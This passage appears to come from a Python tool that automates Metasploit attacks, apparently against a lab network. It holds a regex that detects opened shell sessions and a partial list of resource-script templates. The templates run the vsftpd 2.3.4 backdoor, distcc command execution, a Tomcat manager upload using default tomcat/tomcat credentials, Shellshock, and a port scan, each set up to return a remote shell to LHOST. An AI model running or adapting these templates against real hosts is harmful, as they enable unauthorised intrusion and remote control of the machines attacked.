import re
line = "Command shell session 1 opened (192.168.56.102:4444 -> 192.168.56.103:59460)"
match = re.search(
    r'(Meterpreter|Command shell) session (\d+) opened \(([\d\.]+):(\d+) -> ([\d\.]+):(\d+)\)',
    line
)
print(match.groups() if match else "NO MATCH")

    ("vsftpd", """
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {target}
set LHOST {lhost}
set ExitOnSession true
run
exit
"""),
    ("portscan", """
use auxiliary/scanner/portscan/tcp
set RHOSTS {target}
set PORTS 21,22,23,25,80,139,445,3306,5432,3632,8180,8080
run
exit
"""),
    ("distcc", """
use exploit/unix/misc/distcc_exec
set RHOSTS {target}
set LHOST {lhost}
set ExitOnSession true
run
exit
"""),
    ("tomcat_mgr_upload", """
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS {target}
set LHOST {lhost}
set HTTPUSERNAME tomcat
set HTTPPASSWORD tomcat
set ExitOnSession true
run
exit
"""),
    ("shellshock", """
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS {target}
set RPORT 8080
set LHOST {lhost}
set TARGETURI /cgi-bin/test.cgi
set ExitOnSession true
run
exit
"""),